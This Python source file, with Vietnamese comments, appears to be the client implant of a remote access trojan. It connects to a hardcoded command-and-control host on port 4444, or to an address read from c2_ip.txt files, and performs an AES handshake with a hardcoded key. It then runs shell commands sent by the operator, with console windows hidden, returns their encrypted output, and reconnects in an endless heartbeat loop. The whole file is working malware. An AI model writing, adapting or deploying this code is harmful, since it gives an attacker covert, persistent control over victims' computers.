import json
import os
import socket
import subprocess
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from c2_protocol import (
    MAX_FRAME,
    decrypt,
    encrypt,
    handshake_client,
    recv_frame,
    result_frame,
    send_frame,
)

# Force UTF-8 Mode
if sys.platform == "win32" and hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

# ==========================================
# CẤU HÌNH RAT & KHÓA AES-256
# ==========================================
HACKER_IP = "10.100.17.59"  # C2 Server Host IP
HACKER_PORT = 4444
SECRET_KEY = b"NguoiDepTraiNhatTheGioi_2026"
RECONNECT_DELAY = 5  # Thời gian chờ (giây) trước khi thử gọi lại C2
COMMAND_TIMEOUT = 60  # Giây tối đa cho một lệnh trước khi bị hủy


def get_target_c2_ip():
    exe_dir = os.path.dirname(sys.executable) if getattr(sys, "frozen", False) else os.path.dirname(os.path.abspath(__file__))
    candidates = [
        os.path.join(exe_dir, "c2_ip.txt"),
        "c2_ip.txt",
        os.path.join(os.environ.get("TEMP", ""), "c2_ip.txt"),
        os.path.join(os.path.expanduser("~"), "c2_ip.txt"),
    ]
    for path in candidates:
        try:
            if os.path.exists(path):
                with open(path, "r", encoding="utf-8") as f:
                    ip = f.read().strip()
                    if ip:
                        return ip
        except Exception:
            pass
    return HACKER_IP


def run_command(command, timeout=COMMAND_TIMEOUT):
    """Chạy lệnh, trả về (exit_code, stdout, stderr, duration). Có timeout thật."""
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    started = time.time()
    process = subprocess.Popen(
        command,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        stdin=subprocess.PIPE,
        startupinfo=startupinfo,
    )
    try:
        stdout, stderr = process.communicate(timeout=timeout)
        exit_code = process.returncode
    except subprocess.TimeoutExpired:
        try:
            process.kill()
        except Exception:
            pass
        stdout, stderr = process.communicate()
        stderr = (stderr or b"") + f"\n[!] Lệnh vượt quá {timeout}s và đã bị hủy.\n".encode("utf-8")
        exit_code = -9
    return (
        exit_code,
        (stdout or b"").decode("utf-8", errors="replace"),
        (stderr or b"").decode("utf-8", errors="replace"),
        time.time() - started,
    )


def connect_once():
    target_ip = get_target_c2_ip()
    s = socket_connect(target_ip)
    if s is None:
        return False

    try:
        key, framing = handshake_client(s, SECRET_KEY)
    except Exception:
        try:
            s.close()
        except Exception:
            pass
        return False

    try:
        while True:
            if framing:
                blob = recv_frame(s, MAX_FRAME)
                if blob is None:
                    break
                message = json.loads(decrypt(key, blob).decode("utf-8", errors="replace"))
                if not isinstance(message, dict):
                    continue
                mtype = message.get("type")
                if mtype == "close":
                    return True
                if mtype != "exec":
                    continue
                job_id = message.get("id") or ""
                command = str(message.get("command") or "")
                timeout = int(message.get("timeout") or COMMAND_TIMEOUT)
            else:
                enc_command = s.recv(MAX_FRAME)
                if not enc_command:
                    break
                command = decrypt(key, enc_command).decode("utf-8", errors="replace")
                job_id = ""
                timeout = COMMAND_TIMEOUT
                if command.strip().lower() == "exit":
                    return True

            command = command.strip()
            if not command:
                continue

            # CD nội bộ
            if command.lower().startswith("cd "):
                target_dir = command[3:].strip().strip('"')
                try:
                    os.chdir(target_dir)
                    exit_code, stdout, stderr, duration = 0, f"[+] Đã chuyển thư mục: {os.getcwd()}\n", "", 0.0
                except Exception as exc:
                    exit_code, stdout, stderr, duration = 1, "", f"[-] Lỗi: {exc}\n", 0.0
            else:
                exit_code, stdout, stderr, duration = run_command(command, timeout)

            output = stdout + stderr
            if not output:
                output = "[+] Lệnh thực thi thành công, không có output.\n"

            if framing:
                send_frame(s, result_frame(key, job_id, exit_code, stdout, stderr, duration))
            else:
                s.sendall(encrypt(key, output.encode("utf-8")))
    except Exception:
        pass
    finally:
        try:
            s.close()
        except Exception:
            pass
    return False


def socket_connect(target_ip):
    target_ip = str(target_ip).strip()
    family = socket.AF_INET6 if ":" in target_ip else socket.AF_INET
    if family == socket.AF_INET6:
        host = target_ip
        scope = 0
        if "%" in host:
            host, scope_s = host.split("%", 1)
            try:
                scope = int(scope_s)
            except Exception:
                scope = 0
        address = (host, HACKER_PORT, 0, scope)
    else:
        address = (target_ip, HACKER_PORT)
    s = socket.socket(family, socket.SOCK_STREAM)
    s.settimeout(10.0)
    try:
        s.connect(address)
    except Exception:
        try:
            s.close()
        except Exception:
            pass
        return None
    return s


def main_heartbeat():
    while True:
        try:
            should_exit = connect_once()
            if should_exit:
                break
        except Exception:
            pass
        time.sleep(RECONNECT_DELAY)


if __name__ == "__main__":
    main_heartbeat()
